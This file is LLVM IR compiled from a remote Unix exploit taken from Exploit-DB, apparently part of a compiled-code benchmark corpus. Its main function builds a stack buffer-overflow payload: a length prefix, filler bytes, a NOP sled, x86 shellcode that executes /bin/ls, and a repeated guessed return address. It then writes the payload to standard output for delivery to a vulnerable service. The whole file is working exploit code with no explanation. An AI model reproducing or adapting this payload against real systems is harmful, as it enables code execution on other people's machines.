; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_20374.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_20374.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.shellcode = private unnamed_addr constant [49 x i8] c"\EB\22^\89\F3\89\F7\83\C7\071\C0\AA\89\F9\89\F0\AB\89\FA1\C0\AB\B0\08\04\03\CD\801\DB\89\D8@\CD\80\E8\D9\FF\FF\FF/bin/ls\00", align 16
@stdout = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [49 x i8], align 16
  %6 = alloca i16, align 2
  %7 = alloca [1026 x i8], align 16
  store i32 0, i32* %1, align 4
  store i32 140, i32* %2, align 4
  %8 = load i32, i32* %2, align 4
  %9 = add i32 -1073744052, %8
  store i32 %9, i32* %3, align 4
  %10 = bitcast [49 x i8]* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %10, i8* align 16 getelementptr inbounds ([49 x i8], [49 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 49, i1 false)
  %11 = call zeroext i16 @htons(i32 1024)
  store i16 %11, i16* %6, align 2
  %12 = getelementptr inbounds [1026 x i8], [1026 x i8]* %7, i64 0, i64 0
  %13 = call i32 (i8*, ...) @memcpy(i8* %12, i16* %6, i32 2)
  %14 = getelementptr inbounds [1026 x i8], [1026 x i8]* %7, i64 0, i64 0
  %15 = getelementptr inbounds i8, i8* %14, i64 2
  %16 = call i32 @memset(i8* %15, i32 65, i32 100)
  %17 = getelementptr inbounds [1026 x i8], [1026 x i8]* %7, i64 0, i64 0
  %18 = getelementptr inbounds i8, i8* %17, i64 102
  %19 = call i32 @memset(i8* %18, i32 144, i32 100)
  %20 = getelementptr inbounds [1026 x i8], [1026 x i8]* %7, i64 0, i64 0
  %21 = getelementptr inbounds i8, i8* %20, i64 202
  %22 = getelementptr inbounds [49 x i8], [49 x i8]* %5, i64 0, i64 0
  %23 = call i32 (i8*, ...) @memcpy(i8* %21, i8* %22, i32 48)
  store i32 250, i32* %4, align 4
  br label %24

24:                                               ; preds = %33, %0
  %25 = load i32, i32* %4, align 4
  %26 = icmp ult i32 %25, 850
  br i1 %26, label %27, label %36

27:                                               ; preds = %24
  %28 = getelementptr inbounds [1026 x i8], [1026 x i8]* %7, i64 0, i64 0
  %29 = load i32, i32* %4, align 4
  %30 = zext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = call i32 (i8*, ...) @memcpy(i8* %31, i32* %3, i32 4)
  br label %33

33:                                               ; preds = %27
  %34 = load i32, i32* %4, align 4
  %35 = add i32 %34, 4
  store i32 %35, i32* %4, align 4
  br label %24

36:                                               ; preds = %24
  %37 = load i32, i32* @stdout, align 4
  %38 = call i32 @fileno(i32 %37)
  %39 = getelementptr inbounds [1026 x i8], [1026 x i8]* %7, i64 0, i64 0
  %40 = call i32 @write(i32 %38, i8* %39, i32 1026)
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local zeroext i16 @htons(i32) #2

declare dso_local i32 @memcpy(i8*, ...) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @fileno(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
